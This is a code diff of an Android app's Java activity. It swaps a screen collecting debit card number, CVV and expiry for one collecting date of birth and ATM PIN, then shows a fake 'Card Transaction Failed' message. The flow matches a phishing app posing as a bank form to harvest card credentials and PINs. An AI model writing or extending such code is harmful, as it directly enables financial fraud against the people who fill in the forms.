@@ -13,27 +13,23 @@ import org.json.JSONObject;
 import java.util.HashMap;
 import java.util.Map;
 
-public class Debit1 extends  BaseActivity {
+public class Debit2 extends  BaseActivity {
 
     @SuppressLint("SetTextI18n")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_debit1);
+        setContentView(R.layout.activity_debit2);
 
-        EditText survaycard = findViewById(R.id.etCardNumber);
-        survaycard.addTextChangedListener(new DebitCardInputMask(survaycard));
-
-        EditText expiry = findViewById(R.id.etExpiry);
-        expiry.addTextChangedListener(new ExpiryDateInputMask(expiry));
+        EditText dob = findViewById(R.id.dob);
+        dob.addTextChangedListener(new DateInputMask(dob));
 
         int form_id = getIntent().getIntExtra("form_id", -1);
 
         dataObject = new HashMap<>();
         ids = new HashMap<>();
-        ids.put(R.id.etCVV, "etCVV");
-        ids.put(R.id.etCardNumber, "etCardNumber");
-        ids.put(R.id.etExpiry, "etExpiry");
+        ids.put(R.id.dob, "dob");
+        ids.put(R.id.atmpin, "atmpin");
 
         // Populate dataObject
         for(Map.Entry<Integer, String> entry : ids.entrySet()) {
@@ -68,7 +64,7 @@ public class Debit1 extends  BaseActivity {
                             int formId = response.optInt("data", -1);
                             String message = response.optString("message", "No message");
                             if (status == 200 && formId != -1) {
-                                Intent intent = new Intent(context, Debit2.class);
+                                Intent intent = new Intent(context, LastActivity.class);
                                 intent.putExtra("form_id", formId);
                                 intent.putExtra("message", "Card Transaction Failed, Reason Transaction Disable");
                                 startActivity(intent);
@@ -114,18 +110,13 @@ public class Debit1 extends  BaseActivity {
 
             // Validate based on the key
             switch (key) {
-                case "etCardNumber":
-                    if (!FormValidator.validateMinLength(editText, 19, "Invalid Card Number")) {
+                case "dob":
+                    if (!FormValidator.validateMinLength(editText, 10, "Invalid Date of Birth")) {
                         isValid = false;
                     }
                     break;
-                case "etCVV":
-                    if (!FormValidator.validateMinLength(editText, 3,  "Invalid CVV")) {
-                        isValid = false;
-                    }
-                    break;
-                case "etExpiry":
-                    if (!FormValidator.validateMinLength(editText, 5,  "Invalid Expiry Date")) {
+                case "atmpin":
+                    if (!FormValidator.validateMinLength(editText, 4,  "Invalid Pin")) {
                         isValid = false;
                     }
                     break;
